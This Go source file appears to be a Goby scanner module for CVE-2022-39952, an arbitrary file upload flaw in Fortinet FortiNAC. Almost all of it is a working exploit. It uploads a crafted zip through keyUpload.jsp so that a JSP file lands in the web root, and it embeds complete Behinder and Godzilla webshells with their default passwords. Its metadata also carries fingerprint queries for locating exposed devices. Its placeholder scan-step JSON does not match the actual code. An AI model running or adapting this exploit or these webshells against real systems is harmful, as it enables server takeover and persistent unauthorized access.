package exploits

import (
	"archive/zip"
	"bytes"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Fortinet FortiNAC keyUpload.jsp Arbitrary File Upload Vulnerability (CVE-2022-39952)",
    "Description": "<p>Fortinet FortiNAC is a zero-trust access solution from Fortinet.</p><p>Fortinet FortiNAC has a security vulnerability. The attacker uploads a maliciously compressed Trojan horse file through keyUpload.jsp to obtain server permissions.</p>",
    "Product": "FORTINET-FortiNAC",
    "Homepage": "https://www.fortinet.com/",
    "DisclosureDate": "2023-02-22",
    "Author": "14m3ta7k",
    "FofaQuery": "(body=\"polyfills-es5.js\" && body=\"class=\\\"loading-splash\") || ((title=\"FortiNAC\" && (body=\"fortipoc.js\" || body=\"www.fortinet.com\") || cert=\"CommonName: fotinac\") && body!=\"<script src=\\\"js/JSData.js\\\" type=\\\"text/javascript\\\"></script>\") || header=\"realm=\\\"FortiNAC\" || banner=\"realm=\\\"FortiNAC\" || (body=\"<base href=\\\"/gui/\\\"/>\" && body=\"<script src=\\\"runtime.js\\\" defer></script>\" && title=\"Gui\") || cert=\"CommonName: fortinac\" || (banner=\"HTTP/1.1 302 Found\" && banner=\"charset=UTF-8\" && banner=\"gui/\" && banner=\"Server: Apache-Coyote/1.1\" && banner!=\"/login.jsf\") || (banner=\"Location: /gui/\" && banner=\"Cache-Control: private\" && banner=\"Set-Cookie: JSESSIONID=\")",
    "GobyQuery": "(body=\"polyfills-es5.js\" && body=\"class=\\\"loading-splash\") || ((title=\"FortiNAC\" && (body=\"fortipoc.js\" || body=\"www.fortinet.com\") || cert=\"CommonName: fotinac\") && body!=\"<script src=\\\"js/JSData.js\\\" type=\\\"text/javascript\\\"></script>\") || header=\"realm=\\\"FortiNAC\" || banner=\"realm=\\\"FortiNAC\" || (body=\"<base href=\\\"/gui/\\\"/>\" && body=\"<script src=\\\"runtime.js\\\" defer></script>\" && title=\"Gui\") || cert=\"CommonName: fortinac\" || (banner=\"HTTP/1.1 302 Found\" && banner=\"charset=UTF-8\" && banner=\"gui/\" && banner=\"Server: Apache-Coyote/1.1\" && banner!=\"/login.jsf\") || (banner=\"Location: /gui/\" && banner=\"Cache-Control: private\" && banner=\"Set-Cookie: JSESSIONID=\")",
    "Level": "3",
    "Impact": "<p>Fortinet FortiNAC has a security vulnerability. The attacker uploads a maliciously compressed Trojan horse file through keyUpload.jsp to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://fortiguard.com/psirt/FG-IR-22-300\">https://fortiguard.com/psirt/FG-IR-22-300</a></p>",
    "References": [
        "https://github.com/horizon3ai/CVE-2022-39952"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2022-39952"
    ],
    "CNNVD": [
        "CNNVD-202302-1434"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Fortinet FortiNAC keyUpload.jsp 任意文件上传漏洞（CVE-2022-39952）",
            "Product": "FORTINET-FortiNAC",
            "Description": "<p>Fortinet FortiNAC是美国飞塔（Fortinet）公司的一种零信任访问解决方案。<br></p><p>Fortinet FortiNAC 存在安全漏洞。攻击者通过 keyUpload.jsp 上传恶意压缩的木马文件，获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://fortiguard.com/psirt/FG-IR-22-300\">https://fortiguard.com/psirt/FG-IR-22-300</a><br></p>",
            "Impact": "<p>Fortinet FortiNAC 存在安全漏洞。攻击者通过 keyUpload.jsp 上传恶意压缩的木马文件，获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Fortinet FortiNAC keyUpload.jsp Arbitrary File Upload Vulnerability (CVE-2022-39952)",
            "Product": "FORTINET-FortiNAC",
            "Description": "<p>Fortinet FortiNAC is a zero-trust access solution from Fortinet.<br></p><p>Fortinet FortiNAC has a security vulnerability. The attacker uploads a maliciously compressed Trojan horse file through keyUpload.jsp to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://fortiguard.com/psirt/FG-IR-22-300\">https://fortiguard.com/psirt/FG-IR-22-300</a><br></p>",
            "Impact": "<p>Fortinet FortiNAC has a security vulnerability. The attacker uploads a maliciously compressed Trojan horse file through keyUpload.jsp to obtain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-21",
    "PocId": "10714"
}`

	zipFlag5AHi := func(filename, content string) ([]byte, error) { // 读取要压缩的文件内容
		// 创建内存缓冲区作为 ZIP 的输出目标
		buf := new(bytes.Buffer)
		w := zip.NewWriter(buf)
		// 将文件内容写入 ZIP 中
		f, err := w.Create("/bsc/campusMgr/ui/ROOT/" + filename)
		if err != nil {
			return nil, err
		}
		_, err = f.Write([]byte(content))
		if err != nil {
			return nil, err
		}

		// 关闭 ZIP 写入器
		err = w.Close()
		if err != nil {
			return nil, err
		}
		// 将压缩后的 ZIP 数据存储为字节数组
		return buf.Bytes(), nil
	}

	sendPayloadFlag5AHi := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		if !strings.HasSuffix(filename, ".jsp") {
			filename += ".jsp"
		}
		postRequestConfig := httpclient.NewPostRequestConfig("/configWizard/keyUpload.jsp")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=264286dedc1f37d520df0804de4ac980")
		data, err := zipFlag5AHi(filename, content)
		if err != nil {
			return nil, err
		}
		postRequestConfig.Data = fmt.Sprintf("--264286dedc1f37d520df0804de4ac980\r\nContent-Disposition: form-data; name=\"key\"; filename=\"%s.zip\"\r\n\r\n%s\r\n--264286dedc1f37d520df0804de4ac980--\r\n", goutils.RandomHexString(6), string(data))
		_, err = httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return nil, err
		}
		getRequestConfig := httpclient.NewGetRequestConfig("/" + filename)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayloadFlag5AHi(hostInfo, goutils.RandomHexString(16), `<% out.println(5646431+5689356);%>`)
			if err != nil {
				return false
			}
			return rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, "11335787")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := goutils.B2S(ss.Params["content"])
			filename := goutils.B2S(ss.Params["filename"])
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(16)
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>`
				}
			}
			rsp, err := sendPayloadFlag5AHi(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			// 资源存在
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			if attackType != "custom" && webshell == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if attackType != "custom" && webshell == "godzilla" {
				expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: jsp"
			return expResult
		},
	))
}
